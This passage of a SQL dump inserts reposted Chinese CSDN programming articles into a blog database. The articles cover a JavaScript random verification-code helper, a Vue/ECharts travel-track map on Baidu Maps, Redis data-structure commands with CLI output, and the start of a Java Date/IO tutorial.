//是个数组<br />} else { //发送失败执行的操作<br />console.log(\'发送失败了，错误为：\'+res.rejected) //也是个数组<br />}<br />})<br />return<br />});<br />四、附加 四位随机验证码生成封装<br />let getVerificationCode = (codeLength = 4) =&gt; { //传入需要的字符串长度，不传默认为4<br />// 准备一个用来抽取码的字符串，或者字典<br />// let verification_code_str = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; //数字和字母<br />let verification_code_str = \"0123456789\"; //纯数字<br />// 获取某个范围的随机整数，封装的函数，在上面抽取字典的时候进行了调用<br />function getRandom(min, max) { //意思是获取min-max数字之间的某个随机数，直接调用即可<br />return Math.round(Math.random() * (max - min) + min);<br />}<br />let newStr = \'\'; //创建一个空字符串，用来拼接四位随机码<br />for (var i = 0; i &lt; codeLength; i++) { //for循环四次，则拼接四次随机码<br />newStr += verification_code_str[getRandom(0, verification_code_str.length - 1)]; //从字典中随机选一个下标，并拼接到空字符串中<br />}<br />return newStr<br />}<br /><br /><br />//调用<br />let mycode = getVerificationCode() //可以不传值，默认为4位随机码<br />console.log(\'生成的随机码为：\' + mycode)</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「小小八毛」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/qq_30306717/article/details/121714585</p>', '', 7, ',25,26,27,', '原创', '公开', '已发布', '', 13, '', '', 0, '2021-12-05 22:05:14', '2021-12-05 22:05:14');
INSERT INTO `article` VALUES (17, 'vue中使用echarts完成行程轨迹图', 15, '概述', '<p>最近的项目中遇到了echarts问题，需要用echarts完成患者的行程轨迹图，经历了重重磨难，终于是完成了这项任务，所以做一下记录，以后遇到这类问题就可以迎刃而解了，或者遇到这问题的小伙伴也可以进行参考</p>\n<p>先上两张图，看一下效果</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>这是通过点击不同的患者，显示不同的坐标点和行程轨迹，如果大家不想要这种白色的地图，可以去官方换主题颜色</p>\n<p>接下来进入正文，看看如何实现这样的功能</p>\n<p>一. 因为引入的是百度地图么，所以第一步肯定是去百度地图api官方去注册一个AK，</p>\n<p>直接去百度搜索百度地图api，进入官方，点击如下的这个api</p>\n<p>&nbsp;</p>\n<p>进入api之后，点击左侧菜单栏的开发指南，里面会有账号和获取密钥，点击之后，根据流程来就可以获取到地图的AK了（私人AK绝对不能掺杂任何的利益纠纷！！！）</p>\n<p>二.获取完Ak之后，因为我们是vue项目开发，所以接下来一切都是以vue框架来做演示，获取完AK会给你一个AK的码，然后你去打开的vue项目的public文件下面的index.html</p>\n<p>&lt;script src=\"http://api.map.baidu.com/getscript?v=2.0&amp;ak=你获取到的AK&amp;services=&amp;t=20211124213927\"&gt;&lt;/script&gt;<br />三.在你需要用到地图的文件里面去引入echarts，因为不是全部需要，所以就不全局引入了</p>\n<p>&nbsp;</p>\n<p>import * as echarts from \"echarts\";<br />require(\"echarts/extension/bmap/bmap\");<br />import * as echarts from \"echarts\";</p>\n<p>require(\"echarts/extension/bmap/bmap\");</p>\n<p>四.引入echarts之后，使用echarts的五部曲就是引入echarts，定义一个盒子，来存放echarts图案，初始化echarts，设置echarts图表的option配置，最后就是setOption(option)这个配置 (这个五部曲就是基本的echarts使用必备)</p>\n<p>接下来我直接复制代码</p>\n<p>&lt;template&gt;<br /><br />&lt;a-card&gt;<br /><br />&lt;h3 class=\"cdc-global\"&gt;历史轨迹&lt;/h3&gt;<br /><br />&lt;div id=\"cdc-track\" style=\"height: 400px\"&gt;&lt;/div&gt;<br /><br />&lt;/a-card&gt;<br /><br />&lt;/template&gt;<br /><br /><br /><br />&lt;script&gt;<br /><br />import * as echarts from \"echarts\";<br /><br />// import mapJson from \"./mapJson.json\";<br /><br />require(\"echarts/extension/bmap/bmap\");<br /><br />export default {<br /><br />name: \"Track\",<br /><br />props: {<br /><br />Id: {<br /><br />type: String<br /><br />}<br /><br />},<br /><br />data() {<br /><br />return {<br /><br />// mapJson,<br /><br />option: {},<br /><br />};<br /><br />},<br /><br />watch: {<br /><br />Id(Id) {<br /><br />if (Id !== null) {<br /><br />this.getMap();<br /><br />this.movelineArr = [];<br /><br />}<br /><br />}<br /><br />},<br /><br />methods: {<br /><br />async getMap() {<br /><br />// 计算停留地<br /><br />const datalist = [<br /><br />{ name: \'盛唐超市\'},<br /><br />{ name: \'李宁\'},<br /><br />{ name: \'杏花小区\'},<br /><br />]<br /><br />// 设置停留地<br /><br />const geoCoordMaplist = {<br /><br />盛唐超市: [117.492455,30.657639],<br /><br />李宁: [117.494222,30.657299],<br /><br />杏花小区: [117.495955,30.657639],<br /><br />}<br /><br /><br /><br />// 轨迹<br /><br />var moveLine = {<br /><br />normal: [<br /><br />{\"from\": \"2021-10-9\",\"to\": \"2021-11-1\",\'coords\': [[117.492455,30.657639],[117.494222,30.657299]]},<br /><br />{\"fromName\": \"2021-9-10\",\"toName\":\"2021-10-1\",\'coords\': [[117.494222,30.657299],[117.495955,30.657639]]},<br /><br />{\"fromName\": \"盛唐超市\",\"toName\": \"李宁\",\'coords\': [[117.495955,30.657639],[117.494222,30.657299]]},<br /><br />]<br /><br />};<br /><br />var chartDom = document.getElementById(\"cdc-track\");<br /><br />var myChart = echarts.init(chartDom);<br /><br />var option;<br /><br />const data = datalist;<br /><br />const geoCoordMap = geoCoordMaplist;<br /><br />const convertData = function(data) {<br /><br />var res = [];<br /><br />for (var i = 0; i &lt; data.length; i++) {<br /><br />var geoCoord = geoCoordMap[data[i].name];<br /><br />if (geoCoord) {<br /><br />res.push({<br /><br />name: data[i].name,<br /><br />value: geoCoord.concat(data[i].value)<br /><br />});<br /><br />}<br /><br />}<br /><br />return res;<br /><br />};<br /><br />option = {<br /><br />tooltip: {<br /><br />trigger: \"item\"<br /><br />},<br /><br />bmap: { //百度地图的设置<br /><br />center: [117.492455,30.657639],<br /><br />zoom: 18, //缩放比例<br /><br />roam: true, //是否可以缩放<br /><br />mapStyle: { // 类型设置 可以改变地图的主题<br /><br /><br /><br />// styleJson: this.mapJson<br /><br />}<br /><br />},<br /><br />series: [<br /><br />{<br /><br />name: \"停留点\",<br /><br />type: \"effectScatter\", // 涟漪效果<br /><br />coordinateSystem: \"bmap\", // 依赖的坐标轴<br /><br />data: convertData(data), // 获取的数据<br /><br />symbolSize: 10, // 散点的大小<br /><br />encode: {<br /><br />value: 2<br /><br />},<br /><br />showEffectOn: \"render\", //散点涟漪的样式<br /><br />rippleEffect: {<br /><br />brushType: \"stroke\"<br /><br />},<br /><br />label: { // 显示文字<br /><br />formatter: \"{b}\",<br /><br />position: \"right\",<br /><br />show: true<br /><br />},<br /><br />itemStyle: {<br /><br />color: \"#fcf67b\",<br /><br />shadowBlur: 10,<br /><br />shadowColor: \"#333\"<br /><br />},<br /><br />emphasis: {<br /><br />scale: true<br /><br />},<br /><br />zlevel: 1<br /><br />},<br /><br />// 射线样式 <br /><br />{<br /><br />type: \"lines\",<br /><br />coordinateSystem: \"bmap\",<br /><br />zlevel: 2, //数值越大越在上面<br /><br />large: true,<br /><br />symbol: [\"none\", \"arrow\"],<br /><br />effect: {<br /><br />show: true,<br /><br />period: 6,<br /><br />constantSpeed: 30,<br /><br />trailLength: 0,<br /><br />symbolSize: 3 //圆点大小<br /><br />},<br /><br />lineStyle: {<br /><br />// 线条颜色<br /><br />color: \"#fcf67b\",<br /><br />opacity: 0.6,<br /><br />curveness: 0.2<br /><br />},<br /><br />data: moveLine.normal<br /><br />},<br /><br />// 射线样式<br /><br />{<br /><br />type: \"lines\",<br /><br />coordinateSystem: \"bmap\",<br /><br />zlevel: 3,<br /><br />large: true,<br /><br />effect: {<br /><br />show: true,<br /><br />period: 5,<br /><br />trailLength: 0.8, //特效尾迹的长度<br /><br />color: \"#fff\",<br /><br />symbolSize: 3 //圆点大小<br /><br />},<br /><br />lineStyle: {<br /><br />color: \"#fcf67b\",<br /><br />curveness: 0.2<br /><br />},<br /><br />data: moveLine.normal<br /><br />}<br /><br />]<br /><br />};<br /><br />option &amp;&amp; myChart.setOption(option);<br /><br />},<br /><br /><br /><br />}<br /><br />};<br /><br />&lt;/script&gt;<br /><br />&lt;style&gt;&lt;/style&gt;<br />我这些设置散点都是写死的，你们在用的时候，把自己的数据做一下更改，然后去符合数据类型，要不然设置了不生效，所以得对自己的数据做一下修改</p>\n<p>如果大家只需要轨迹图的话，那么就把有关射线的样式删除即可。</p>\n<p>好了，这就是关于echarts实现行程轨迹的分享，我这是初出茅庐，所以各位大佬有什么意见请留言给我。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「M-A-F」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/wzj12345545646/article/details/121712687</p>', '', 8, ',25,26,27,', '原创', '公开', '已发布', '', 49846, '', '', 0, '2021-12-05 22:06:32', '2021-12-05 22:06:32');
INSERT INTO `article` VALUES (18, 'redis 五种数据结构常用操作命令详解（String,list,set,zset,hash)', 9, '概述', '<p>🍅程序员小王的博客：程序员小王的博客<br />🍅 欢迎点赞 👍 收藏 ⭐留言 📝<br />🍅 如有编辑错误联系作者，如果有比较好的文章欢迎分享给我，我会取其精华去其糟粕<br />🍅java自学的学习路线：</p>\n<p>redis 五种数据结构总结目录<br />一、String常见命令<br />1、内存存储模型<br />2、常用操作命令<br />3、常规命令具体实现<br />（1）设置/获取一个值<br />（2）设置多个值/获取多个值<br />（3）获取原始的key值，设置新值<br />（4）获取key对应的值的长度<br />（5）给key对应的值的追加值<br />（6）截取value的内容<br />（7）创建并且设置key存活的时间（用来做秒杀之类的）<br />（8）存在不做任何操作，不存在添加一个或多个值<br />（9）对字符串中是数值的减少（如果不是数值，如:\"12a\"就不能执行改操作）<br />（10）对字符串中是数值（包含小数点）的增加（如果不是数值，如:\"12a\"就不能执行改操作）<br />二、List类型<br />1.内存存储模型<br />2.常用操作指令<br />3、具体实现<br />（1）lpush将某个值加入到一个key列表头部<br />（2）lpushx同lpush,但是必须要保证这个key存在<br />（3）rpush|将某个值加入到一个key列表末尾<br />（4）rpushx同rpush,但是必须要保证这个key存在<br />（5）lpop返回和移除列表左边的第一个元素<br />（6）rpop返回和移除列表右边的第一个元素<br />（7）lrange获取某一个下标区间内的元素<br />（8）llen获取列表元素个数<br />（9）lset设置某一个指定索引的值(索引必须存在)<br />（10）lindex获取某一个指定索引位置的元素<br />（11）lrem删除重复元素<br />（12）ltrim 保留列表中特定区间内的元素<br />（13）linsert、在某一个元素之前，之后插入新元素<br />三、Set类型<br />1.内存存储模型<br />2.常用命令<br />(1)sadd:为集合添加元素(无序，自动去重)<br />(2)smebers:显示集合中所有元素 无序（member:成员）<br />(3)scard：返回集合中元素的个数<br />(4)spop:随机返回一个元素 并将元素在集合中删除<br />(5)smove:从一个set集合中向另一个set集合移动元素 必须是同一种类型<br />(6)srem:从集合中删除一个元素<br />(7)sismeber:判断一个集合中是否含有这个元素（sis=sister姐妹）<br />(8)srandmember:随机返回元素（srand:乐趣，根据自己的乐趣返回值）<br />(9)sdiff:去掉第一个集合中其它集合含有的相同元素 (不会操作原始集合元素)<br />(10)sinter:求交集（intersection：交集）<br />(11)sunion:求和集（union：合集）<br />四、 ZSet类型 SortSet可排序SET<br />1.内存模型<br />2.常用命令<br />（1）zadd：添加一个有序集合元素<br />（2）zcard：返回集合的元素个数<br />（3）zrange 升序 zrevrange 降序：返回一个范围内的元素<br />（4）zrangebyscore：按照分数查找一个范围内的元素 (实现分页)<br />（5）zrank：返回排名<br />（6）zrevrank：倒序排名<br />（7）zscore：显示某一个元素的分数<br />（8）zrem：移除某一个元素<br />（9）zincrby：给某个特定元素加分/减分<br />五、hash类型 Map<br />Redis 是完全开源的，遵守 BSD 协议，是一个高性能的 key-value 数据库。</p>\n<p>Redis 与其他 key - value 缓存产品有以下三个特点：</p>\n<p>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</p>\n<p>Redis支持数据的备份，即master-slave模式的数据备份。</p>\n<p>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</p>\n<p>&ensp;&ensp;&ensp;&ensp;String&mdash;&mdash;字符串<br />&ensp;&ensp;&ensp;&ensp;Hash&mdash;&mdash;字典<br />&ensp;&ensp;&ensp;&ensp;List&mdash;&mdash;列表<br />&ensp;&ensp;&ensp;&ensp;Set&mdash;&mdash;集合<br />&ensp;&ensp;&ensp;&ensp;ZSet&mdash;&mdash;有序集合</p>\n<p>一、String常见命令<br />string 是 redis 最基本的类型，你可以理解成与 Memcached 一模一样的类型，一个 key 对应一个 value。</p>\n<p>string 类型是二进制安全的。意思是 redis 的 string 可以包含任何数据。比如jpg图片或者序列化的对象。</p>\n<p>string 类型是 Redis 最基本的数据类型，string 类型的值最大能存储 512MB。</p>\n<p>1、内存存储模型</p>\n<p><br />2、常用操作命令<br />命令 说明<br />set 设置一个key/value<br />get 根据key获得对应的value<br />mset 一次设置多个key value<br />mget 一次获得多个key的value<br />getset 获得原始key的值，同时设置新值<br />strlen 获得对应key存储value的长度<br />append 为对应key的value追加内容<br />getrange 索引0开始 截取value的内容（range:范围）<br />setex 设置一个key存活的有效期（秒）（ex=expire）<br />psetex 设置一个key存活的有效期（毫秒）<br />setnx 存在不做任何操作,不存在添加<br />msetnx原子操作(只要有一个存在不做任何操作) 可以同时设置多个key,只有有一个存在都不保存<br />decr 进行数值类型的-1操作<br />decrby 根据提供的数据进行减法操作<br />Incr 进行数值类型的+1操作<br />incrby 根据提供的数据进行加法操作<br />Incrbyfloat 根据提供的数据加入浮点数<br />3、常规命令具体实现<br />（1）设置/获取一个值<br />set 设置一个key/value<br />get 根据key获得对应的value</p>\n<p><br />（2）设置多个值/获取多个值<br />mset 一次设置多个key value<br />mget 一次获得多个key的value</p>\n<p><br />（3）获取原始的key值，设置新值<br />getset 获得原始key的值，同时设置新值<br />rename 修改键的名字</p>\n<p><br />（4）获取key对应的值的长度<br />strlen 获得对应key存储value的长度</p>\n<p><br />（5）给key对应的值的追加值<br />append 为对应key的value追加内容</p>\n<p><br />（6）截取value的内容<br />getrange 索引0开始 截取value的内容（range:范围）</p>\n<p><br />（7）创建并且设置key存活的时间（用来做秒杀之类的）<br />setex 设置一个key存活的有效期（秒）（ex=expire）<br />psetex 设置一个key存活的有效期（毫秒）</p>\n<p>&nbsp;</p>\n<p><br />（8）存在不做任何操作，不存在添加一个或多个值<br />setnx 存在不做任何操作,不存在添加<br />msetnx原子操作(只要有一个存在不做任何操作) 可以同时设置多个key,只有有一个存在都不保存</p>\n<p><br />（9）对字符串中是数值的减少（如果不是数值，如:\"12a\"就不能执行改操作）<br />decrease 减少<br />decr 进行数值类型的-1操作<br />decrby 根据提供的数据进行减法操作</p>\n<p><br />（10）对字符串中是数值（包含小数点）的增加（如果不是数值，如:\"12a\"就不能执行改操作）<br />Increment:自增<br />Incr 进行数值类型的+1操作<br />incrby 根据提供的数据进行加法操作<br />Incrbyfloat 根据提供的数据加入浮点数</p>\n<p><br />二、List类型<br />// list类型 元素有序 且 可以重复</p>\n<p>1.内存存储模型</p>\n<p><br />2.常用操作指令<br />命令 说明<br />lpush 将某个值加入到一个key列表头部<br />lpushx 同lpush,但是必须要保证这个key存在<br />rpush 将某个值加入到一个key列表末尾<br />rpushx 同rpush,但是必须要保证这个key存在<br />lpop 返回和移除列表左边的第一个元素<br />rpop 返回和移除列表右边的第一个元素<br />lrange 获取某一个下标区间内的元素<br />llen 获取列表元素个数<br />lset 设置某一个指定索引的值(索引必须存在)<br />lindex 获取某一个指定索引位置的元素<br />lrem 删除重复元素<br />ltrim 保留列表中特定区间内的元素<br />linsert 在某一个元素之前，之后插入新元素<br />3、具体实现<br />（1）lpush将某个值加入到一个key列表头部<br />倒序排序，先进去的在后面<br />lpush users whj yfj zs li ww</p>\n<p>1<br />2<br />3</p>\n<p><br />（2）lpushx同lpush,但是必须要保证这个key存在<br />127.0.0.1:6379&gt; lpushx names win7<br />127.0.0.1:6379&gt; lrange names 0 -1<br />1) \"win7\"<br />2) \"whj\"<br />3) \"yfj\"<br />4) \"zs\"<br />5) \"li\"<br />6) \"ww\"<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8</p>\n<p>&nbsp;</p>\n<p><br />（3）rpush|将某个值加入到一个key列表末尾<br />127.0.0.1:6379&gt; lrange users 0 -1<br />杨福君<br />zx<br />dzw<br />lfk<br />whx<br />zxj<br />yfj<br />whj<br />王恒杰</p>\n<p>127.0.0.1:6379&gt; rpush users 杨福君<br />10</p>\n<p>127.0.0.1:6379&gt; lrange users 0 -1<br />杨福君<br />zx<br />dzw<br />lfk<br />whx<br />zxj<br />yfj<br />whj<br />王恒杰<br />杨福君<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25</p>\n<p><br />（4）rpushx同rpush,但是必须要保证这个key存在<br />127.0.0.1:6379&gt; rpushx names whj<br />0</p>\n<p>127.0.0.1:6379&gt; rpushx users whj<br />11</p>\n<p>127.0.0.1:6379&gt; lrange users 0 -1<br />杨福君<br />zx<br />dzw<br />lfk<br />whx<br />zxj<br />yfj<br />whj<br />王恒杰<br />杨福君<br />whj<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18</p>\n<p><br />（5）lpop返回和移除列表左边的第一个元素<br />127.0.0.1:6379&gt; lrange users 0 -1<br />zx<br />dzw<br />lfk<br />whx<br />zxj<br />yfj<br />whj<br />王恒杰<br />杨福君<br />whj</p>\n<p>127.0.0.1:6379&gt; lpop users<br />zx</p>\n<p>127.0.0.1:6379&gt; lrange users 0 -1<br />dzw<br />lfk<br />whx<br />zxj<br />yfj<br />whj<br />王恒杰<br />杨福君<br />whj<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25</p>\n<p><br />（6）rpop返回和移除列表右边的第一个元素<br />从右边弹出来四个<br />127.0.0.1:6379&gt; lrange users 0 -1<br />dzw<br />lfk<br />whx<br />zxj<br />yfj<br />whj<br />王恒杰<br />杨福君<br />whj</p>\n<p>127.0.0.1:6379&gt; rpop users<br />whj<br />127.0.0.1:6379&gt; rpop users<br />杨福君<br />127.0.0.1:6379&gt; rpop users<br />王恒杰<br />127.0.0.1:6379&gt; rpop users<br />whj</p>\n<p>127.0.0.1:6379&gt; lrange users 0 -1<br />dzw<br />lfk<br />whx<br />zxj<br />yfj</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28</p>\n<p><br />（7）lrange获取某一个下标区间内的元素<br />lpush users whj yfj dzw zx whx zxj</p>\n<p>1<br />2</p>\n<p><br />（8）llen获取列表元素个数<br />llen users</p>\n<p>1<br />2</p>\n<p><br />（9）lset设置某一个指定索引的值(索引必须存在)<br />lset users 3 lhh</p>\n<p>1<br />2</p>\n<p><br />（10）lindex获取某一个指定索引位置的元素<br />lindex users 3</p>\n<p>1<br />2</p>\n<p><br />（11）lrem删除重复元素<br />rpush users whj</p>\n<p>1<br />2</p>\n<p><br />lrem users 2 whj</p>\n<p>1<br />2</p>\n<p><br />（12）ltrim 保留列表中特定区间内的元素<br />ltrim users 0 3</p>\n<p>1<br />2</p>\n<p><br />（13）linsert、在某一个元素之前，之后插入新元素<br />linsert users before whx whj</p>\n<p>1<br />2<br />在某个元素之前添一个数</p>\n<p><br />在某个数之后添加一个数<br />linsert users after zx lfk<br />1</p>\n<p><br />三、Set类型<br />key String</p>\n<p>vlaue Set集合类型 元素不能存在重复 元素无序 String</p>\n<p>特点: Set类型 Set集合 元素无序 不可以重复</p>\n<p>1.内存存储模型</p>\n<p><br />2.常用命令<br />命令 说明<br />sadd 为集合添加元素<br />smembers 显示集合中所有元素 无序（member:成员）<br />scard 返回集合中元素的个数<br />spop 随机返回一个元素 并将元素在集合中删除<br />smove 从一个集合中向另一个集合移动元素 必须是同一种类型<br />srem 从集合中删除一个元素<br />sismember 判断一个集合中是否含有这个元素（sis=sister姐妹）<br />srandmember 随机返回元素（srand:乐趣，根据自己的乐趣返回值）<br />sdiff 去掉第一个集合中其它集合含有的相同元素 (不会操作原始集合元素)<br />sinter 求交集（intersection：交集）<br />sunion 求和集（union：合集）<br />(1)sadd:为集合添加元素(无序，自动去重)<br />sadd names 王恒杰 杨福君周宣君 邓正武 吴洪旭 张茜<br />1</p>\n<p><br />(2)smebers:显示集合中所有元素 无序（member:成员）<br />smembers names<br />1</p>\n<p><br />(3)scard：返回集合中元素的个数<br />scard names<br />1</p>\n<p><br />(4)spop:随机返回一个元素 并将元素在集合中删除<br />spop names<br />1</p>\n<p><br />(5)smove:从一个set集合中向另一个set集合移动元素 必须是同一种类型<br />smove names goodfriend 邓正武<br />1</p>\n<p><br />(6)srem:从集合中删除一个元素<br />srem names 吴洪旭<br />1</p>\n<p><br />(7)sismeber:判断一个集合中是否含有这个元素（sis=sister姐妹）<br />sismember names 张茜<br />1</p>\n<p><br />(8)srandmember:随机返回元素（srand:乐趣，根据自己的乐趣返回值）<br />srandmember names 1<br />1</p>\n<p><br />(9)sdiff:去掉第一个集合中其它集合含有的相同元素 (不会操作原始集合元素)<br />sdiff names goodfriend<br />1</p>\n<p><br />(10)sinter:求交集（intersection：交集）<br />sinter names goodfriend<br />1</p>\n<p><br />(11)sunion:求和集（union：合集）<br />sunion names goodfriend<br />1</p>\n<p><br />四、 ZSet类型 SortSet可排序SET<br />ZSET</p>\n<p>特点: 1.不可重复 2.可排序的set集合 根据元素分数进行排序</p>\n<p>key String</p>\n<p>value ZSET</p>\n<p>值=分数+值</p>\n<p>1.内存模型</p>\n<p><br />2.常用命令<br />命令 说明<br />zadd 添加一个有序集合元素<br />zcard 返回集合的元素个数<br />zrange 升序 zrevrange 降序 返回一个范围内的元素<br />zrangebyscore 按照分数查找一个范围内的元素 (实现分页)<br />zrank 返回排名<br />zrevrank 倒序排名<br />zscore 显示某一个元素的分数<br />zrem 移除某一个元素<br />zincrby 给某个特定元素加分<br />（1）zadd：添加一个有序集合元素<br />zadd schoolreport 30 杨福君 50 邓正武 70 吴洪旭 100 王恒杰<br />1<br />（2）zcard：返回集合的元素个数<br />zcard schoolreport <br />1</p>\n<p><br />（3）zrange 升序 zrevrange 降序：返回一个范围内的元素<br />返回升序排名zrange<br />zadd schoolreport 30 杨福君 50 邓正武 70 吴洪旭 100 王恒杰<br />zrange schoolreport 0 -1<br />1<br />2</p>\n<p><br />返回倒序排名(reverse：反转)zrevrange<br />（4）zrangebyscore：按照分数查找一个范围内的元素 (实现分页)<br />zrevrange schoolreport 0 -1<br />1</p>\n<p>&nbsp;</p>\n<p><br />（5）zrank：返回排名<br />zrank schoolreport 王恒杰<br />1</p>\n<p><br />（6）zrevrank：倒序排名<br />zrevrank schoolreport 王恒杰<br />1</p>\n<p><br />（7）zscore：显示某一个元素的分数<br />zscore schoolreport 王恒杰<br />1</p>\n<p><br />（8）zrem：移除某一个元素<br />zrem schoolreport 吴洪旭<br />1</p>\n<p><br />（9）zincrby：给某个特定元素加分/减分<br />给某个特定元素加分<br />zincrby schoolreport 30 杨福君<br />1</p>\n<p><br />给某个特定元素减分<br />zincrby schoolreport -2 杨福君<br />1</p>\n<p><br />（9）zset实现分页</p>\n<p>zrangebyscore schoolreport 0 100 withscores limit 0 2<br />1</p>\n<p><br />五、hash类型 Map&lt;String,String&gt;<br />key:String</p>\n<p>value: Map&lt;String,String&gt;</p>\n<p>特点: value 是一个map结构 存在key value key 无序的</p>\n<p>（1）内存模型</p>\n<p><br />（2）常用命令<br />命令 说明<br />hset 设置一个key/value对<br />hget 获得一个key对应的value<br />hgetall 获得所有的key/value对<br />hdel 删除某一个key/value对<br />hexists 判断一个key是否存在<br />hkeys 获得所有的key<br />hvals 获得所有的value<br />hmset 设置多个key/value<br />hmget 获得多个key的value<br />hsetnx 设置一个不存在的key的值<br />hincrby 为value进行加法运算<br />hincrbyfloat 为value加入浮点值<br />（3）常规命令具体实现<br />1、hset|设置一个key/value对<br />2、hget|获得一个key对应的value<br />3、hgetall|获得所有的key/value对</p>\n<p><br />4、hdel|删除某一个key/value对<br />5、hexists|判断一个key是否存在</p>\n<p><br />6、hkeys|获得所有的key<br />7、hvals|获得所有的value</p>\n<p><br />8、hmset|设置多个key/value<br />9、hmget|获得多个key的value</p>\n<p><br />10、hsetnx|设置一个不存在的key的值</p>\n<p><br />11、hincrby|为value进行加法运算</p>\n<p><br />12、hincrbyfloat|为value加入浮点值</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「小王java」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/weixin_44385486/article/details/121720115</p>', '', 9, ',35,', '原创', '公开', '已发布', '', 65165, '', '', 0, '2021-12-05 22:10:17', '2021-12-05 22:10:17');
INSERT INTO `article` VALUES (19, 'redis日志分析', 9, '概述', '<p>首先复习一下IO流：<br />关于读取文件：<br />BufferedReader<br />从字符输入流中读取文本，缓冲各个字符，从而提供字符、数组和行的高效读取</p>\n<p>InputStreamReader<br />字节流通向字符流的桥梁 以UTF-8编码读取</p>\n<p>FileInputStream<br />从文件系统中的某个文件中获取输入字节</p>\n<p>这三个通常一起使用：<br />BufferedReader reader=new BufferedReader<br />(new InputStreamReader(new FileInputStream(new File(path))));</p>\n<p>1<br />2<br />3<br />终的意思是：从path指定的路径中的文件以UFT-8解码，最终生成BufferedReader 对象，读取文件内容<br />之前在万年历的时候讲解了Calendar类，这里补充一下Java Date类：<br />在 Java 中获取当前时间，可以使用 java.util.Date 类和 java.util.Calendar 类完成。其中，Date 类主要封装了系统的日期和时间的信息，Calendar 类则会根据系统的日历来解释 Date 对象</p>\n<p>Date 类<br />Date 类表示系统特定的时间戳，可以精确到毫秒。Date 对象表示时间的默认顺序是星期、月、日、小时、分、秒、年。</p>\n<p>1. 构造方法<br />Date 类有如下两个构造方法。<br />Date()：此种形式表示分配 Date 对象并初始化此对象，以表示分配它的时间（精确到毫秒），使用该构造方法创建的对象可以获取本地的当前时间。<br />Date(long date)：此种形式表示从 GMT 时间（格林尼治时间）1970 年 1 月 1 日 0 时 0 分 0 秒开始经过参数 date 指定的毫秒数。<br />Date date1 = new Date(); // 调用无参数构造函数<br />System.out.println(date1.toString()); // 输出：Wed May 18 21:24:40 CST 2016<br />Date date2 = new Date(60000); // 调用含有一个long类型参数的构造函数<br />System.out.println(date2); // 输出：Thu Jan 0108:01:00 CST 1970<br />1<br />2<br />3<br />4<br />2. 常用方法：</p>\n<p><br />举个例子：假设，某一天特定时间要去做一件事，而且那个时间已经过去一分钟之后才想起来这件事还没有办，这时系统将会提示已经过去了多 长时间。具体的代码如下：<br />import java.util.Date;<br />import java.util.Scanner;<br />public class Test11 {<br />public static void main(String[] args) {<br />Scanner input = new Scanner(System.in);<br />System.out.println(\"请输入要做的事情：\");<br />String title = input.next();<br />Date date1 = new Date(); // 获取当前日期<br />System.out.println(\"[\" + title + \"] 这件事发生时间为：\" + date1);<br />try {<br />Thread.sleep(60000);// 暂停 1 分钟<br />} catch (InterruptedException e) {<br />e.printStackTrace();<br />}<br />Date date2 = new Date();<br />System.out.println(\"现在时间为：\" + date2);<br />if (date2.before(date1)) {<br />System.out.println(\"你还有 \" + (date2.getTime() - date1.getTime()) / 1000 + \" 秒需要去完成【\" + title + \"】这件事！\");<br />} else {<br />System.out.println(\"【\" + title + \"】事情已经过去了 \" + (date2.getTime() - date1.getTime()) / 1000 + \" 秒\");<br />}<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />在该程序中，分别使用 Date 类的无参数构造方法创建了两个 Date 对象。在创建完第一个 Date 对象后，使用 Thread.sleep() 方法让程序休眠 60 秒，然后再创建第二个 Date 对象，这样第二个 Date 对象所表示的时间将会在第一个 Date 对象所表示时间之后，因此&ldquo;date2.before(date1)&rdquo;条件表达式不成立，从而执行 else 块中的代码，表示事情已经发生过。</p>\n<p>请输入要做的事情：<br />收快递<br />【收快递】这件事发生时间为：Fri Oct 12 11:11:07 CST 2018<br />现在时间为：Fri Oct 12 11:12:07 CST 2018<br />【收快递】事情已经过去了 60 秒<br />1<br />2<br />3<br />4<br />5<br />顺带再次回顾一下Calendar 类：<br />Calendar 类是一个抽象类，它为特定瞬间与 YEAR、MONTH、DAY_OF&mdash;MONTH、HOUR 等日历字段之间的转换提供了一些方法，并为操作日历字段（如获得下星期的日期） 提供了一些方法。</p>\n<p>创建 Calendar 对象不能使用 new 关键字，因为 Calendar 类是一个抽象类，但是它提供了一个 getInstance() 方法来获得 Calendar类的对象。getInstance() 方法返回一个 Calendar 对象，其日历字段已由当前日期和时间初始化。<br />Calendar c = 